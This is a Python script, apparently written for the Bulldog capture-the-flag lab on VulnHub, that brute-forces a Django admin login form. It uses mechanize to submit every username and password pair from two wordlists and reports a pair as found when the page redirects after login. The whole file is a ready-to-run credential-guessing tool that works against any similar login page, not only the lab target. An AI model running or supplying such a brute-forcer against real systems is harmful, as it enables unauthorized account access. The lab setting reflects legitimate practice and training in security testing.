#!/usr/bin/python env
#Used for Bulldog CTF on VulnHub
#Will bruteforce django admin panel login, try using cewl to make a wordlist or something
from __future__ import print_function #I just like python 3's print function

from sys import argv
import mechanize
import progressbar


if len(argv) < 4: #print usage if not enough arguments
    print("Usage: %s [login page url] [user_wordlist] [pass_wordlist]" % argv[0])
    exit(0)

def read_wordlist(word_list):
    return [word for line in open(word_list, 'r') for word in line.rstrip('\n').split()]

def display_progress(fname):
    with open(fname)as f:
            for i, l in enumerate(f):
                pass
    return i + 1

br = mechanize.Browser() #initialize browser object
loginPage = "http://192.168.56.101/admin/login/" #used as a reference url for the loop
line_num = display_progress(argv[2]) #hopefully the userlist is as long as the pass list
count = 0

#initialize progress bar
bar = progressbar.ProgressBar(maxval=line_num, \
        widgets=[progressbar.Bar('=', '[',']'), ' ', progressbar.Percentage()])
"""Make the = sign fill inbetween the [ ] signs. Anything not filled will be blank space"""
bar.start()

# try one username with all the passwords and then move on, takes a while, but it's more complete
for u in read_wordlist(argv[2]): #enumerate length of wordlist for the loop
    for p in read_wordlist(argv[3]):
        response = br.open(argv[1]) #login page url

        br.select_form(nr=0) #use br.select_form(nr=0) if no form name, will select first form in page
        """print("Trying Username: %s and Password: %s" % (u, p)) #for debugging purposes"""

        br.form['username'] = u
        br.form['password'] = p

        br.method = "POST" #set method to post
        response = br.submit() #submit post

        if response.geturl() != loginPage: #check if you were redirected to the admin panel
            print("Found username and Password!")
            print("Username: %s || Password: %s" % (u, p)) #must use tuple with the format strings
            count = count + 1
            bar.update(count)
            text = raw_input("Do you wish to continue? y/n ")
            if (text == "y" or text == "Y"):
                continue
            else:
                exit(0)
        else:
            count = count + 1
            bar.update(count)
            continue
